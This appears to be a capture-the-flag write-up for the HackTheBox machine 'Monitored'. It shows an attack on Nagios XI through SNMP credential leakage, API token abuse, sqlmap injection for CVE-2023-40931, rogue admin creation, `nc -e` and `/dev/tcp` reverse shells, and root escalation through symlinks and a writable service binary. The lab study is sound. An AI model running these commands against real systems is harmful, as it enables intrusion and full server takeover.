Main steps
1. Enumerate `SNMP` for credentials
2. Fuzz website for API endpoints to generate an authentication token
3. Login with the token
4. Locate public exploit for SQL injection
5. Dump database for API key
6. Use API key to create a new admin user
7. Use admin dashboard to run reverse shell command on the server for user access
8. Enumerate `sudo -l` for misconfigured script
9. Privilege escalate either by abusing `symlinks` or writable service binary

Learning points
1. Remember to fuzz separately for `api` endpoints - does not show up when using `raft-medium-directories.txt` (need to add the `/api/v1` to the URL)
2. Lots of stuff relating to API endpoints and fuzzing here
3. Enumerate all `sudo` scripts properly as there many be multiple different misconfigurations allowing for different kinds of privilege escalation - here we have abusing `symlinks` on a writable file, and abusing a service binary with write permissions
4. How to enumerate service binaries manually (`linpeas` does this somewhere in its output as well)

`nmap`
![[Pasted image 20260310180115.png]]

Ports 22, 80, 389 (LDAP), 443 (SSL), 5667 open
According to https://whatportis.com/ports/5667_nsca-nagios, port 5667 is the `Nagios Service Check Acceptor` port

Website redirects to `https://nagios.monitored.htb` when trying to access.
![[Pasted image 20260310180251.png]]

Clicking the access button redirects to a login page. Attempted to login with default credentials but was unable to.
![[Pasted image 20260310180453.png]]

`Whatweb` and `SSLScan` both returned nothing interesting.
`ffuf` returned a few subdomains, but trying to access them lead to the same default page.
![[Pasted image 20260310181504.png]]

Enumerating `ldap` using `nmap`'s `ldap-rootdse` script also does not return anything interesting.
![[Pasted image 20260310182427.png]]

Found nothing interesting, so I did a UDP scan and found that the `SNMP` port 161 was open. Tried to query `SNMP` with `SNMPBulkWalk` with the community string `public` and found a lot of information.

Something that looks like credentials
![[Pasted image 20260310183214.png]]

`svc` : ` XjH7VCehowpR1xZB `

Unable to SSH or login to the console with these credentials, but got a different error on the login page.
![[Pasted image 20260310183509.png]]

According to this one forum post from 2016, https://support.nagios.com/forum/viewtopic.php?p=310411#p310411, there is a deprecated way to generate an authentication token in `Nagios XI` that is not in their documentation by POSTing to `/api/v1/authenticate`. This allows us to generate an authentication token even with a disabled user account.

`authenticate` is not in any of the `Seclists` API fuzzing wordlists so it will not show up there. Need to run `Feroxbuster` with `raft-medium-drectories` specifying `/nagios/api` to fuzz it.

```
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
```

Tried sending the `curl` request and got an authentication token.
![[Pasted image 20260310190205.png]]

Looking at the other `curl` request in the forum post, it seems like appending `&token=TOKEN` after the `.php` may allow me to access pages.
```
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png
```

Tried doing so in the URL by sending `https://nagios.monitored.htb/nagiosxi/index.php?token=b852c5985dcb8d1ad654fac23c2a10ba6621d21a` and was able to gain access.
![[Pasted image 20260310190833.png]]

Found a version number here, `Nagios XI 5.11.0`.
![[Pasted image 20260310191305.png]]

Searching up the version shows that it is vulnerable to a few different SQL injection attacks. (CVE-2023-40931, CVE-2023-40934, CVE-2023-40933)

Looking at CVE-2023-40931: A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php.

Tried this URL to inject SQL
```
https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3' UNION SELECT 1,2;--
```
and got this error message
```
SQL Error [nagiosxi] : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' UNION SELECT 1,2;-- and user_id = 2' at line 1
```

Tried testing a few payloads like UNION SELECT but kept getting the same syntax error message.
![[Pasted image 20260310193605.png]]

Searching the CVE returns a POC on GitHub https://github.com/G4sp4rCS/CVE-2023-40931-POC/tree/main that automates the token generation and SQL injection using `SQLMap`. Since this injection is blind SQLi, I went ahead and used this POC to try to dump the database tables.

```
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=4ot2kbhnedmc1jrd85koe4f40q" --batch --threads 10 --dbs

sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=4ot2kbhnedmc1jrd85koe4f40q" --batch --threads 10 -D nagiosxi --tables

sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=4ot2kbhnedmc1jrd85koe4f40q" --batch --threads 10 -D nagiosxi -T xi_users --dump
```

Got two accounts with this
![[Pasted image 20260310195630.png]]

`svc` which we already know, and
`nagiosadmin` : ` $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C ` with a Bcrypt hashed password.

Tried cracking the hash with `hashcat` but was unable to.
The database also contains an API key for the `nagiosadmin` user. This key might be able to be used to query the `Nagios XI` admin API functions.
` IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL `

With the API key, it is possible to use `Feroxbuster` to fuzz for API objects/ endpoints using 
```
feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1 --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -m GET,POST -k
```

Based on the results, the valid API paths here return a 200 OK, but `Feroxbuster` does not automatically go into those directories. The `system` and `user` paths seem interesting, so I ran another scan with them.

`Feroxbuster` on the `/system` path:
![[Pasted image 20260310201653.png]]

Nothing interesting in the first few, but I noticed that it is possible to POST to `/system/user`. Googling this API endpoint shows that this is how you add a user to `Nagios XI`, with the `curl` request below:
```
curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=xxx&pretty=1" \
  -d "username=robertdeniro&password=test&name=Robert%20De%20Niro&email=robertdeniro@localhost&auth_level=admin&monitoring_contact=1"
```

Tried sending this `curl` request with the API key for `nagiosadmin` and got a user account successfully created message.
![[Pasted image 20260310202056.png]]

Able to login as newly created user `test`: ` test1 `
![[Pasted image 20260310202147.png]]

Looking around the admin dashboard a bit, under `Host Status` > `localhost`, there seems to be an option to `Connect to localhost`.
![[Pasted image 20260310203003.png]]

However, clicking on it does not seem to do anything other than download an RDP config file.

Under Navigation > Configure > Core Config Manager, the is an option to add commands.
![[Pasted image 20260310203113.png]]

Tried adding a few new commands to spawn a reverse shell.
![[Pasted image 20260310203136.png]]

Under Hosts > localhost, it is possible to run the commands added.
![[Pasted image 20260310203215.png]]

`nc -e /bin/bash 10.10.14.77 4444` worked to spawn a reverse shell.
![[Pasted image 20260310203408.png]]

Enumerating `sudo -l` shows that the user `nagios` can run a list of scripts as `sudo` with no password.
![[Pasted image 20260310203706.png]]

The `nagios` and `npcd` binaries do not seem to exist, so ignore those.
Looking at the scripts first:
`getprofile.sh` seems to create a bunch of files, then `tail` a bunch of log files to those newly created files, then zip everything into one zip folder.
![[Pasted image 20260310204935.png]]

Checking the files that it reads shows that most of them are under `/var/log` or which are not writable by the `nagios` user.
![[Pasted image 20260310205127.png]]
![[Pasted image 20260310205208.png]]

However, the last logfile, `/usr/local/nagiosxi/tmp/phpmailer.log`, is writable.

^ According to the writeup on HTB, this is the intended file to overwrite.
To do so, remove the `phpmailer.log` file, then create a `symlink` to `/root/.ssh/id_rsa` with a new `phpmailer.log` file at the same file path with `ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log`. When the script is run as `sudo`, it will read the `root` SSH key due to the `symlink` and write it to the zip file, allowing us to read it.
![[Pasted image 20260310210531.png]]

However, I noticed that this is not the only file that is writable by `nagios`. There are a bunch of logfiles under `/usr/local/nagiosxi/var` that are accessed by the script as well. I tried removing the `cmdsubsys.log` file and creating a `symlink` there, then ran the script, and was also able to read the SSH key.
![[Pasted image 20260310210800.png]]

Able to login with SSH as root.
![[Pasted image 20260310210811.png]]

Additionally, there is another unintended way to get root on this machine, using another script, `/usr/local/nagiosxi/scripts/manage_services.sh`. This script takes 2 parameters, defined in the script itself, and executes the command based on the parameters.
![[Pasted image 20260310211127.png]]

Looking a the rest of the script, we are on a `Debian` machine, so the script calls
![[Pasted image 20260310211154.png]]

which basically will call `sudo systemctl $ACTION $SERVICE`.
If any of the services that are defined in the `second` variable above can be written to, it would be possible to make use of this script to privilege escalate with `systemctl`.

From before, we know that the `nagios` and `npcd` binaries were missing from the default service path at `/etc/init.d`, so those are a good place to start.

A `bash` script to enumerate services:
```
for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd/ -name "$service.service"; done
```

Another script to enumerate the permissions of service binaries. What it does is find the service definition files, pipe those into another loop, then extract the executable path with `grep Exec | cut -d= -f 2 | cut -d' ' -f 1`, and show the file permissions of that executable. `linpeas.sh` also does this in its checks.
```
for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd/ -name "$service.service"; done | while read service_file; do ls -l $(cat "$service_file" | grep Exec | cut -d= -f 2 | cut -d' ' -f 1); done | sort -u
```

Running this script shows that the `nagios` service executable at `/usr/local/nagios/bin/nagios` is writable.
![[Pasted image 20260310212513.png]]

By making use of the `systemctl` privilege escalation method here https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740, it is possible to privilege escalate with the `manage_services.sh` script.

Replaced the `nagios` binary at `/usr/local/nagios/bin/nagios` with my malicious service. The service file from the GitHub page did not work this time, so I tried writing a script to start a `nc` reverse shell using ` echo "#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.77/4444 0>&1" >> nagios ` instead, and running `sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios` worked to spawn a reverse shell.
![[Pasted image 20260310213809.png]]

Another way to do this is to write this script to the file:
```
#!/bin/bash

cp /bin/bash /tmp/script
chown root:root /tmp/script
chmod 6777 /tmp/script
```

Run the service with the script, then navigate to the folder and run with `-p` to maintain privileges.
![[Pasted image 20260310214033.png]]